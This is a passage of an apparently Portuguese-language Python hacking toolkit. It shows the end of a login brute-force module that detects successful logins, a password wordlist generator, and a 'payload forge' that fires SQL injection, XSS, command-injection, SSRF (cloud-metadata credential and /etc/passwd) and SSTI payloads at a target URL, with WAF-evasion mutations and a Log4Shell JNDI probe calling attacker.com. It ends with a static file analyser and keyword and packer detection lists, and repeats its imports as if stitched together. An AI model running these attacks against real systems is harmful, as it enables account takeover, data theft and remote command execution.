                initial_response = initial_session.get(target, headers=base_headers, timeout=10)
                
                                              
                input_pattern = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', re.IGNORECASE)
                
                                                                                     
                for match in input_pattern.finditer(initial_response.text):
                    name, value = match.groups()
                    hidden_fields[name] = value
                
                                                                   
                                                                                  
                csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', initial_response.text)
                
                if csrf_match is not None:
                    hidden_fields['csrf_token'] = csrf_match.group(1)
                
                                          
                initial_cookies = dict(initial_session.cookies)
                print(f"[INFO] Cookies iniciais capturados: {list(initial_cookies.keys())}")
                print(f"[INFO] Campos ocultos detectados: {list(hidden_fields.keys())}")

                                                                               
                print("[INFO] Enviando credencial de teste para calibrar assinatura de falha...")
                fp_data = {user_field: "theceltic_fp_user", pass_field: "theceltic_fp_pass", **hidden_fields}
                fp_headers = base_headers.copy()
                                                       
                if 'csrf_token' in hidden_fields:
                    fp_headers['X-CSRFToken'] = hidden_fields['csrf_token']
                
                fp_response = initial_session.post(target, data=fp_data, headers=fp_headers, timeout=10, allow_redirects=False)
                
                                                                                                
                failure_signature = {
                    "status": fp_response.status_code,
                    "length": len(fp_response.content),
                    "cookies": set(initial_session.cookies.keys())
                }
                print(f"[INFO] Assinatura de Falha: Status={failure_signature['status']}, Len={failure_signature['length']}")
                
            except Exception as e:
                print(f"[ERRO] Falha no Fingerprinting: {e}")
                                                                              
                failure_signature = {"status": 200, "length": 0, "cookies": set()}
                hidden_fields = {}

            def test_http(cand):
                                                                       
                                                                                      
                s = requests.Session()
                if use_proxy:
                    s.proxies = {"http": proxy_url, "https": proxy_url}
                
                try:
                                                                             
                                                                           
                    initial_get = s.get(target, headers=base_headers, timeout=10)
                    
                                                                                       
                    current_csrf = None
                    csrf_match_session = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', initial_get.text)
                    if csrf_match_session:
                        current_csrf = csrf_match_session.group(1)
                    
                    headers_req = base_headers.copy()
                    if current_csrf:
                        headers_req['X-CSRFToken'] = current_csrf
                        
                                              
                    data = {user_field: cand['user'], pass_field: cand['password'], **hidden_fields}
                    response = s.post(target, data=data, headers=headers_req, timeout=10, allow_redirects=False)
                    
                                                 
                    
                                                                       
                                                                                           
                    new_cookies = set(s.cookies.keys())
                    success_cookies = new_cookies - failure_signature["cookies"]
                    if success_cookies:
                                                                                 
                        session_cookie_names = ['sessionid', 'connect.sid', 'session', 'auth_token', 'JSESSIONID']
                        if any(sc in name for name in success_cookies for sc in session_cookie_names):
                            return cand

                                                                           
                    if response.status_code != failure_signature["status"]:
                                                              
                        if response.status_code < 400:
                            return cand

                                                          
                    if 'application/json' in response.headers.get('Content-Type', ''):
                        try:
                            resp_json = response.json()
                                                                  
                            success_keys = ['token', 'session', 'access_token', 'user_id', 'logged_in', 'success', 'data', 'sessionid']
                            for key in success_keys:
                                if key in resp_json:
                                    val = resp_json[key]
                                    if val is not None and val is not False and val != "" and val != []:
                                                                                          
                                        if key == 'success' and val == True:
                                            return cand
                                                                               
                                        if key in ['token', 'session', 'access_token'] and isinstance(val, str) and len(val) > 10:
                                            return cand
                        except Exception:
                            pass

                                                                  
                    resp_text_lower = response.text.lower()
                    success_html_keywords = ['dashboard', 'welcome', 'logout', 'my account', 'profile', 'igsh', 'sessionid']
                    if any(shk in resp_text_lower for shk in success_html_keywords):
                        return cand

                    return None
                except requests.exceptions.RequestException as e:
                    raise
                finally:
                    s.close()                            

            run_parallel_attack(candidates, test_http, "HTTP", max_workers=5, delay_per_request=0.2)

        elif sub_op == 5:                      
            print("\n[5] GERADOR DE WORDLIST (CRACKLIB)")
            base_users = input("Usuários base (separados por vírgula): ").strip() or "admin,root,user"
            base_passes = input("Palavras base (separadas por vírgula): ").strip() or "password,123,secret"
            suffixes = input("Sufixos (separados por vírgula, ENTER para vazio): ").strip() or "1,123,2023,2024,!"
            
            u_list = [u.strip() for u in base_users.split(',')]
            p_list = [p.strip() for p in base_passes.split(',')]
            s_list = [s.strip() for s in suffixes.split(',')] if suffixes else ['']
            
            print("[INFO] Gerando combinações...")
            wordlist = set()
            for u in u_list:
                for p in p_list:
                    for s in s_list:
                                                                         
                        wordlist.add(f"{u}:{p}{s}")
                        wordlist.add(f"{u}:{u}{s}")
                        wordlist.add(f"{u}:{p.capitalize()}{s}")
            
            output_file = "theceltic_bruteforce_wordlist.txt"
            with open(output_file, 'w') as f:
                f.write("\n".join(sorted(wordlist)))
            print(f"\n[OK] Wordlist gerada em {output_file} com {len(wordlist)} combinações.")
            print(f"Formato: usuário:senha. Use no próximo run selecionando a opção 4 e carregando este arquivo.")

        else:
            print("[!] Opção inválida.")

    except ValueError:
        print("[!] Digite um número válido.")
    except KeyboardInterrupt:
        print("\n\n[!] Operação cancelada pelo usuário.")
        
def payload_forge():
    import requests
    import urllib.parse
    import json
    import time
    import secrets

    print("\n" + "="*50)
    print(" 🧪 THECELTIC PAYLOAD FORGE [FIELD MODE]")
    print("="*50)
    print("""
    [1] SQL Injection (SQLi) - Teste Ativo & Payloads
    [2] Cross-Site Scripting (XSS) - Teste Ativo & Payloads
    [3] Command Injection (OSI) - Teste Ativo & Payloads
    [4] Log4Shell / JNDI - Gerador de Probes
    [5] SSRF / SSTI - Gerador de Probes
    [6] Gerar Wordlist de Mutations (Para ffuf/Burp)
    [0] Voltar ao Menu
    """)
    
    try:
        sub_op = int(input("Escolha o tipo de ataque: "))
        
        if sub_op == 0:
            return

        def save_output(content, filename="theceltic_field_results.txt", header=""):
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# {header}\n# Gerado por TheCeltic Field Mode\n# Data: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write(content)
            print(f"{GREEN}[OK] Resultados salvos em {filename}{RESET}")

        def generate_mutations(base_payload):
            
            mutations = [base_payload]
            
                             
            try:
                mutations.append(urllib.parse.quote(base_payload, safe=''))
            except:
                pass

                              
            try:
                html_mut = base_payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")
                mutations.append(html_mut)
            except:
                pass

                                                      
            mutations.append(base_payload.replace(" ", "+"))
            mutations.append(base_payload.replace(" ", "%20"))
            mutations.append(base_payload.replace(" ", " "))
            mutations.append(base_payload.replace(" ", "/**/"))
            
                                                                   
            mutations.append(base_payload.upper())
            mutations.append(base_payload.lower())
            mutations.append(base_payload.swapcase())
            
                                                   
            if "${" in base_payload:
                mutations.append(base_payload.replace("${", "${${"))
                mutations.append(base_payload.replace(":", ":${"))
            
                                                      
            if ";" in base_payload or "|" in base_payload:
                mutations.append(base_payload.replace(" ", "\n"))
                mutations.append(base_payload.replace(" ", "\r\n"))
                mutations.append(base_payload.replace(" ", "%0A"))
                mutations.append(base_payload.replace(" ", "%0D%0A"))
                mutations.append(base_payload.replace(" ", "\\n"))

                                                
            seen = set()
            unique_mutations = []
            for m in mutations:
                if m not in seen:
                    seen.add(m)
                    unique_mutations.append(m)
            return unique_mutations

        def active_test(url, method="GET", payload_field=None, payloads=None, success_indicators=None, error_indicators=None):
            """
            Executa um teste ativo injetando payloads e analisando a resposta.
            """
            headers = {
                "User-Agent": "TheCelticField/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }
            
            results = []
            print(f"\n{YELLOW}[TESTE ATIVO]{RESET} Iniciando varredura em: {url}")
            print(f"Payloads para testar: {len(payloads)}")
            
            for payload in payloads:
                try:
                                      
                    if payload_field:
                        if method == "GET":
                            params = {payload_field: payload}
                            response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
                        elif method == "POST":
                            data = {payload_field: payload}
                            response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
                    else:
                                                                                             
                        if "{{payload}}" in url:
                                                         
                            encoded_payload = urllib.parse.quote(payload, safe='')
                            final_url = url.replace("{{payload}}", encoded_payload)
                            response = requests.get(final_url, headers=headers, timeout=10, verify=False)
                        else:
                                                                                 
                            params = {"payload": payload}
                            response = requests.get(url, params=params, headers=headers, timeout=10, verify=False)
                    
                                         
                    status = response.status_code
                    content = response.text[:5000]                                   
                    content_lower = content.lower()
                    
                    is_success = False
                    is_error = False
                    reason = ""
                    
                                                              
                    if error_indicators:
                        for indicator in error_indicators:
                            if indicator.lower() in content_lower:
                                is_error = True
                                reason = f"Indicador de erro encontrado: {indicator}"
                                break
                    
                                               
                    if success_indicators:
                        for indicator in success_indicators:
                            if indicator.lower() in content_lower:
                                is_success = True
                                reason = f"Indicador de sucesso encontrado: {indicator}"
                                break
                    
                                                      
                    
                    if not is_success and not is_error:
                        if payload in content or urllib.parse.quote(payload, safe='') in content:
                            is_success = True
                            reason = "Payload refletido na resposta (Possível XSS/Reflexão)"

                    results.append({
                        "payload": payload,
                        "status": status,
                        "result": "SUCCESS" if is_success else ("ERROR" if is_error else "NEUTRAL"),
                        "reason": reason
                    })
                    
                    if is_success:
                        print(f"{GREEN}[HIT]{RESET} Payload: {payload[:50]}... | Status: {status} | {reason}")
                    elif is_error:
                        print(f"{YELLOW}[ERR]{RESET} Payload: {payload[:50]}... | Status: {status} | {reason}")
                    else:
                        print(f"{RESET}[---] Payload: {payload[:50]}... | Status: {status}")

                except requests.exceptions.RequestException as e:
                    print(f"{RED}[FAIL]{RESET} Erro de rede: {e}")

            return results

                                           

        if sub_op == 1:       
            print("\n[1] SQLi Field Mode")
            url = input("URL Base (ex: http://lab.com/search.php?q=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: q) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None
            
            print("\n[2] Tipo de SQLi:")
            print("1. In-Line (União/1=1)")
            print("2. Error-Based (Extrair Erro)")
            print("3. Time-Based (Blind)")
            print("4. Stacked (Múltiplos comandos)")
            sqli_type = int(input("Escolha (1-4): "))

            error_indicators = ["sql syntax", "mysql_fetch", "pg_query", "ora-", "unclosed quotation mark", "syntax error", "valid mysql result"]
            success_indicators = ["admin", "root", "true", "1"]                                       

            if sqli_type == 1:
                base_payloads = [
                    "1' OR 1=1-- ",
                    "1' OR '1'='1",
                    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
                    "1' AND 1=1-- ",
                    "1' AND 1=2-- "
                ]
            elif sqli_type == 2:
                base_payloads = [
                    "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- ",
                    "' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)-- ",
                    "1' AND 1/0-- "
                ]
            elif sqli_type == 3:
                base_payloads = [
                    "1' AND SLEEP(5)-- ",
                    "1' AND BENCHMARK(5000000,SHA1('TEST'))-- ",
                    "1' AND pg_sleep(5)-- "
                ]
            else:          
                base_payloads = [
                    "1'; DROP TABLE users-- ",
                    "1'; SELECT * FROM sys.tables-- ",
                    "1'; EXEC xp_cmdshell 'whoami'-- "
                ]
            
            print("Gerando mutações para bypass de WAF...")
            final_payloads = []
            for bp in base_payloads:
                final_payloads.extend(generate_mutations(bp))
            
                               
            final_payloads = list(set(final_payloads))
            
            save_choice = input("Deseja salvar a lista de payloads em TXT antes de testar? (s/n): ").lower() == 's'
            if save_choice:
                with open("theceltic_sqli_mutations.txt", 'w') as f:
                    f.write("\n".join(final_payloads))
                print(f"{GREEN}[OK] Mutations salvas em theceltic_sqli_mutations.txt{RESET}")

            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )
                                             
                if any(r["result"] == "SUCCESS" for r in results):
                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_sqli_hits.json", "SQLi Active Test Results")

        elif sub_op == 2:      
            print("\n[2] XSS Field Mode")
            url = input("URL Base (ex: http://lab.com/search.php?q=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: q) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None

            print("\n[2] Contexto XSS:")
            print("1. HTML (Texto puro)")
            print("2. Attribute (Dentro de atributo)")
            print("3. JavaScript (Dentro de JS)")
            print("4. Universal (Polyglot)")
            xss_type = int(input("Escolha (1-4): "))

                                                                                  
            success_indicators = ["theceltic_xss_marker"] 
            error_indicators = []

            if xss_type == 1:
                payloads = [
                    "<script>alert('TheCeltic_XSS_Marker')</script>",
                    "<img src=x onerror=alert('TheCeltic_XSS_Marker')>",
                    "<svg onload=alert('TheCeltic_XSS_Marker')>"
                ]
            elif xss_type == 2:
                payloads = [
                    "\" onmouseover=alert('TheCeltic_XSS_Marker')",
                    "' onmouseover=alert('TheCeltic_XSS_Marker')",
                    "` onmouseover=alert('TheCeltic_XSS_Marker')"
                ]
            elif xss_type == 3:
                payloads = [
                    "'; alert('TheCeltic_XSS_Marker'); //",
                    "\"; alert('TheCeltic_XSS_Marker'); //",
                    "`; alert('TheCeltic_XSS_Marker'); //"
                ]
            else:
                payloads = [
                    "\"'><img src=x onerror=alert('TheCeltic_XSS_Marker')>",
                    "';\"><script>alert('TheCeltic_XSS_Marker')</script>",
                    "`'><svg/onload=alert('TheCeltic_XSS_Marker')>"
                ]

                                   
            final_payloads = []
            for p in payloads:
                final_payloads.extend(generate_mutations(p))
            final_payloads = list(set(final_payloads))

            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                                                               
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )
                if any(r["result"] == "SUCCESS" for r in results):
                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_xss_hits.json", "XSS Active Test Results")

        elif sub_op == 3:                    
            print("\n[3] Command Injection Field Mode")
            url = input("URL Base (ex: http://lab.com/ping.php?ip=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: ip) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None

            payloads = [
                "127.0.0.1; whoami",
                "127.0.0.1 | whoami",
                "127.0.0.1 `whoami`",
                "127.0.0.1 $(whoami)",
                "127.0.0.1 && whoami"
            ]
            
                               
            final_payloads = []
            for p in payloads:
                final_payloads.extend(generate_mutations(p))
            final_payloads = list(set(final_payloads))

                                                                  
            success_indicators = ["root", "www-data", "apache", "nobody", "uid=", "gid="]
            error_indicators = []

            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )

        elif sub_op == 4:            
            print("\n[4] Log4Shell / JNDI Probes")
            
            unique_id = secrets.token_hex(8)
            base_url = input("Seu domínio/IP para o callback (ex: 192.168.1.10): ").strip() or "attacker.com"
            payload = "${" + "${lower:j}ndi:ldap://" + base_url + "/theceltic_" + unique_id + "}}"
            
            print(f"\n{GREEN}PAYLOAD GERAL:{RESET}\n{payload}")
            print(f"\n{YELLOW}COMO TESTAR:{RESET}")
            print(f"1. Inicie um listener LDAP: ldapsearch -x -H ldap://{base_url} -b '' -s base -LLL")
            print(f"   Ou use: java -cp . LdapServer")
            print(f"2. Insira este payload em headers (User-Agent, X-Forwarded-For) ou parâmetros.")
            print(f"3. Monitore o callback para a string: theceltic_{unique_id}")
            
            save_choice = input("Salvar payload em TXT? (s/n): ").lower() == 's'
            if save_choice:
                save_output(payload, "theceltic_log4shell_payload.txt", "Log4Shell Probe")

        elif sub_op == 5:              
            print("\n[5] SSRF / SSTI Field Mode")
            print("1. SSRF (Cloud Metadata & Internal Services)")
            print("2. SSTI (Server-Side Template Injection)")
            sub_5 = int(input("Escolha (1-2): "))
            
            url = input("URL Base (ex: http://lab.com/fetch?url=): ").strip()
            method = input("Método (GET/POST) [GET]: ").strip().upper() or "GET"
            field = input("Nome do campo para injeção (ex: url) [ENTER para usar {{payload}}]: ").strip()
            
            if not field:
                if "{{payload}}" not in url:
                    url = url + "?{{payload}}"
                field = None

            if sub_5 == 1:       
                payloads = [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://127.0.0.1:8080/admin",
                    "http://localhost:5984/_all_dbs",
                    "gopher://localhost:6379/_INFO",
                    "dict://localhost:6379/info",
                    "file:///etc/passwd"
                ]
                                                                                         
                success_indicators = ["ami-id", "instance-id", "accesskey", "root:", "etc/passwd", "admin", "dashboard"]
                error_indicators = ["connection refused", "timeout", "404 not found"]
                
            else:       
                payloads = [
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7*7 %>",
                    "#{7*7}",
                    "{{self.__class__.__mro__}}",
                    "{{config.items()}}",
                    "{{7*'A'}}"
                ]
                
                success_indicators = ["49", "AAA", "mro", "config", "jinja2", "mako", "django", "tornado"]
                error_indicators = ["syntaxerror", "invalidsyntax", "templateerror"]

            final_payloads = list(set(payloads))
            
            test_choice = input("Executar Teste Ativo agora? (s/n): ").lower() == 's'
            if test_choice:
                results = active_test(
                    url=url,
                    method=method,
                    payload_field=field,
                    payloads=final_payloads,
                    success_indicators=success_indicators,
                    error_indicators=error_indicators
                )
                if any(r["result"] == "SUCCESS" for r in results):
                    save_output(json.dumps(results, indent=2, ensure_ascii=False), "theceltic_ssrf_ssti_hits.json", "SSRF/SSTI Active Test Results")

        elif sub_op == 6:                              
            print("\n[6] Gerador de Wordlist de Mutations (Para ffuf/Burp)")
            print("1. SQLi (Comentários, Whitespace, Case)")
            print("2. XSS (HTML Entities, URL Encoding)")
            print("3. Command Injection (Newlines, Whitespace)")
            print("4. Log4Shell (Nested Braces)")
            print("5. Custom (Digite o payload base)")
            
            mut_type = int(input("Escolha (1-5): "))
            output_file = input("Nome do arquivo de saída (padrão: theceltic_mutations.txt): ").strip() or "theceltic_mutations.txt"
            
            base_payload = ""
            if mut_type == 5:
                base_payload = input("Digite o payload base: ").strip()
            else:
                                                        
                if mut_type == 1:
                    base_payload = "1' OR 1=1-- "
                elif mut_type == 2:
                    base_payload = "<script>alert(1)</script>"
                elif mut_type == 3:
                    base_payload = "; whoami"
                elif mut_type == 4:
                    base_payload = "${jndi:ldap://attacker.com/a}"

            print(f"Gerando mutações baseadas em: {base_payload}")
            
                                                        
            final_mutations = generate_mutations(base_payload)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(final_mutations))
            
            print(f"{GREEN}[OK] {len(final_mutations)} mutações salvas em {output_file}{RESET}")
            print(f"Dica: Use 'ffuf -w {output_file} -X GET -H 'User-Agent: TheCeltic' -- {url}'")

        else:
            print("[!] Opção inválida.")

    except ValueError:
        print("[!] Digite um número válido.")
    except KeyboardInterrupt:
        print("\n\n[!] Operação cancelada pelo usuário.")

import os
import hashlib
import re
import math
import struct
import json
import platform
import datetime
import html
import zipfile
from collections import Counter

                         
class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'

                                                        
RED = C.RED
GREEN = C.GREEN
YELLOW = C.YELLOW
BLUE = C.BLUE
RESET = C.RESET

import os
import sys
import re
import math
import struct
import hashlib
import platform
import zipfile
import datetime
from collections import Counter

             
RESET = '\033[0m'
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'

def reverse_engineer():
    print("\n" + "="*50)
    print(f"{BLUE} 🔬 THECELTIC REVERSE ENGINEER [FIELD MODE]{RESET}")
    print("="*50)
    print(f"{BLUE}Análise estática de binários, scripts e arquivos de dados.")
    print(f"{BLUE}Recursos: Entropia, Strings, Packer Detection, PE/ELF Headers.")
    print("")
    
                  
    current_os = platform.system()
    print(f"[INFO] Ambiente: {current_os}")
    print("")
    
    file_path = input("Caminho do arquivo (ex: ./beacon.exe ou ./script.py): ").strip()
    
    if not os.path.exists(file_path):
        print(f"{RED}[ERRO]{RESET} Arquivo não encontrado: {file_path}")
        return

    file_size = os.path.getsize(file_path)
    if file_size == 0:
        print(f"{RED}[ERRO]{RESET} O arquivo está vazio.")
        return

    print(f"\n[INFO] Analisando: {os.path.basename(file_path)}")
    print(f"[INFO] Tamanho: {file_size} bytes ({file_size/1024:.2f} KB)")

                
    print("\n" + "-"*20)
    print(" [1] HASHING (Integridade)")
    print("-"*20)
    hashes = {}
    for algo in ['md5', 'sha1', 'sha256']:
        h = hashlib.new(algo)
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                h.update(block)
        hashes[algo] = h.hexdigest()
        print(f"{algo.upper()}: {hashes[algo]}")
    
                 
    print("\n" + "-"*20)
    print(" [2] ANÁLISE DE ENTROPIA")
    print("-"*20)
    with open(file_path, 'rb') as f:
        data = f.read()
    
    if not data:
        print("Arquivo vazio.")
        return

                                                     
    byte_counts = Counter(data)
    total_bytes = len(data)
    
    entropy = 0.0
    for count in byte_counts.values():
        p_x = count / total_bytes
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
            
    print(f"Entropia: {entropy:.4f} bits/byte")
    if entropy > 7.5:
        print(f"{RED}[ALERTA]{RESET} Alta entropia. Possível ofuscamento, criptografia ou Packer.")
    elif entropy > 6.0:
        print(f"{YELLOW}[INFO]{RESET} Entropia média. Binário provavelmente não empacotado.")
    else:
        print(f"{GREEN}[INFO]{RESET} Entropia baixa. Arquivo pode ser texto, script ou binário simples.")

                
    print("\n" + "-"*20)
    print(" [3] EXTRAÇÃO DE STRINGS CRÍTICAS")
    print("-"*20)
    pattern = re.compile(b'[\x20-\x7E]{6,}')
    strings_found = set(m.group(0).decode('utf-8', errors='ignore') for m in pattern.finditer(data))
    
    security_keywords = [
        r'http://', r'https://', r'ldap://', r'amqp://', r'mqtt://',
        r'password', r'passwd', r'secret', r'api_key', r'token', r'credential',
        r'admin', r'root', r'system32', r'registry', r'winreg', r'hkcu', r'hklm',
        r'powershell', r'cmd.exe', r'bash', r'sh -c', r'exec', r'system',
        r'theceltic', r'beacon', r'c2', r'callback', r'jndi', r'log4shell',
        r'sleep', r'benchmark', r'pg_sleep', r'extractvalue', r'updatexml',
        r'union', r'select', r'insert', r'update', r'delete', r'drop',
        r'onerror', r'onload', r'onclick', r'javascript:', r'vbscript:',
        r'whoami', r'id', r'uname', r'ifconfig', r'ipconfig', r'netstat',
        r'169.254.169.254', r'metadata', r'iam', r'security-credentials'
    ]
    
    interesting_strings = []
    for s in strings_found:
        for kw in security_keywords:
            if re.search(kw, s, re.IGNORECASE):
                interesting_strings.append(s)
                break

    if interesting_strings:
        print(f"Encontradas {len(interesting_strings)} strings de interesse:")
        for s in interesting_strings[:30]:
            display_s = s[:120] + ("..." if len(s) > 120 else "")
            print(f"  - {display_s}")
        
        save_choice = input("Deseja salvar TODAS as strings em um arquivo .txt? (s/n): ").lower() == 's'
        if save_choice:
            out_file = os.path.basename(file_path) + "_strings.txt"
            with open(out_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(sorted(interesting_strings)))
            print(f"{GREEN}[OK]{RESET} Strings salvas em {out_file}")
    else:
        print(f"{YELLOW}[INFO]{RESET} Nenhuma string crítica encontrada.")

                           
    print("\n" + "-"*20)
    print(" [4] DETECTOR DE PACKER (Assinaturas)")
    print("-"*20)
    packers = {
        b'UPX!': "UPX",
        b'UPX0': "UPX (Zeroed)",
        b'Themida': "Themida",
        b'VMProtect': "VMProtect",
        b'ASPack': "ASPack",
        b'FSG': "FSG (FSGuard)",
        b'PEtite': "PEtite",
        b'MPRESS': "MPRESS",
        b'Nspack': "NSPack",
        b'PECompact': "PECompact",
        b"Yoda's Cryptic": "Yoda's Cryptic",
        b'Armadillo': "Armadillo",
        b'Enigma': "Enigma Protector",
        b'ASProtect': "ASProtect",
        b'ExeCryptor': "ExeCryptor",
        b'PEbundle': "PEbundle"
    }
    found_packer = None
    for sig, name in packers.items():
        if sig in data:
            found_packer = name
            break
            
    if found_packer:
        print(f"{RED}[ALERTA]{RESET} Packer detectado: {found_packer}")
        print("Recomendação: Descompacte (unpack) antes de análise estática profunda.")
    else:
        print(f"{GREEN}[OK]{RESET} Nenhum packer comum detectado.")

                                    
    print("\n" + "-"*20)
    print(" [5] ANÁLISE ESPECÍFICA POR TIPO")
    print("-"*20)
    
    file_type = "Desconhecido"
    
                                     
    if data[:2] == b'MZ':
        file_type = "Executável Windows (PE)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável Windows (PE).")
        try:
                                  
            pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
            
                                      
            if pe_offset + 24 > len(data):
                raise ValueError("Arquivo truncado ou offset inválido")

            if data[pe_offset:pe_offset+4] == b'PE\0\0':
                
                              
                machine = struct.unpack('<H', data[pe_offset+4:pe_offset+6])[0]
                               
                timestamp_raw = struct.unpack('<I', data[pe_offset+8:pe_offset+12])[0]
                try:
                    timestamp = datetime.datetime.utcfromtimestamp(timestamp_raw).isoformat()
                except:
                    timestamp = "N/A"
                
                opt_header_size = struct.unpack('<H', data[pe_offset+20:pe_offset+22])[0]
                
                opt_start = pe_offset + 24
                
                                                             
                if opt_start + 0x42 <= len(data):
                    subsystem = struct.unpack('<H', data[opt_start + 0x40:opt_start + 0x42])[0]
                    sub_name = {2: "GUI", 3: "CUI", 1: "Native", 7: "POSIX"}.get(subsystem, f"Unknown ({subsystem})")
                else:
                    sub_name = "N/A (Truncado)"

                print(f"[INFO] PE Header válido no offset: {hex(pe_offset)}")
                print(f"[INFO] Machine: {hex(machine)}")
                print(f"[INFO] Timestamp: {timestamp}")
                print(f"[INFO] Subsystem: {sub_name}")
                
            else:
                print(f"{YELLOW}[WARN]{RESET} MZ header presente, mas PE header não encontrado no offset esperado.")
        except (struct.error, IndexError, ValueError) as e:
            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar estrutura PE: {e}")
    
                                    
    elif data[:4] == b'\x7fELF':
        file_type = "Executável Linux (ELF)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável Linux (ELF).")
        try:
                               
            e_ident_class = data[4]                       
            e_machine = struct.unpack('<H', data[18:20])[0]
            print(f"[INFO] Classe: {'32-bit' if e_ident_class == 1 else '64-bit' if e_ident_class == 2 else 'Unknown'}")
            
                                
            path_strings = re.findall(b'[/\\][\w\-\.]+[/\\][\w\-\.]+', data)
            if path_strings:
                unique_paths = list(set(path_strings))[:10]
                print(f"[INFO] Strings de caminho detectadas ({len(unique_paths)}):")
                for ps in unique_paths:
                    print(f"  - {ps.decode('utf-8', errors='ignore')}")
        except Exception as e:
            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar ELF: {e}")
    
                                       
    
    macho_magics = [b'\xfe\xed\xfa\xce', b'\xcf\xfa\xed\xfe', b'\xfe\xed\xfa\xcf', b'\xcf\xfa\xed\xfe']
    if data[:4] in macho_magics:
        file_type = "Executável macOS (Mach-O)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Executável macOS (Mach-O).")
                       
        try:
                                                 
            if data[:4] == b'\xfe\xed\xfa\xce':
                endian = '<'
            elif data[:4] == b'\xcf\xfa\xed\xfe':
                endian = '>'
            elif data[:4] == b'\xfe\xed\xfa\xcf':
                endian = '<'
            elif data[:4] == b'\xcf\xfa\xed\xfe':
                endian = '>'
            else:
                endian = '<'          

            cputype = struct.unpack(f'{endian}I', data[4:8])[0]
            cpusubtype = struct.unpack(f'{endian}I', data[8:12])[0]
            filetype = struct.unpack(f'{endian}I', data[12:16])[0]
            
            cpu_names = {7: "x86", 12: "x86_64", 18: "ARM", 19: "ARM64"}
            file_type_names = {1: "OBJECT", 2: "EXECUTE", 3: "DYNAMICLINK", 4: "CORE"}
            
            print(f"[INFO] CPU Type: {cpu_names.get(cputype, hex(cputype))}")
            print(f"[INFO] File Type: {file_type_names.get(filetype, filetype)}")
        except Exception as e:
            print(f"{YELLOW}[WARN]{RESET} Erro ao analisar Mach-O: {e}")

                           
    elif file_path.endswith('.py') or b'import ' in data[:1024]:
        file_type = "Script Python"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como Script Python.")
        try:
            content = data.decode('utf-8', errors='ignore')
                            
            imports = re.findall(r'^\s*import\s+([\w\.]+)', content, re.MULTILINE)
            from_imports = re.findall(r'^\s*from\s+([\w\.]+)\s+import', content, re.MULTILINE)
            
            all_imports = set(imports + from_imports)
            if all_imports:
                print(f"Imports detectados ({len(all_imports)}):")
                for imp in sorted(all_imports):
                    print(f"  - {imp}")
            
            if 'subprocess' in content:
                print(f"{RED}[ALERTA]{RESET} Uso de 'subprocess' detectado.")
            if 'socket' in content:
                print(f"{YELLOW}[INFO]{RESET} Uso de 'socket' detectado.")
            if 'os.system' in content:
                print(f"{RED}[ALERTA]{RESET} Uso de 'os.system' detectado.")
        except Exception as e:
            print(f"Erro ao ler script: {e}")

                            
    elif data[:4] == b'PK\x03\x04':
        file_type = "Arquivo ZIP (Possível JAR/Office)"
        print(f"{GREEN}[INFO]{RESET} Arquivo identificado como formato ZIP.")
        try:
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                file_list = zip_ref.namelist()
                                               
                is_jar = any(f.endswith('.class') for f in file_list)
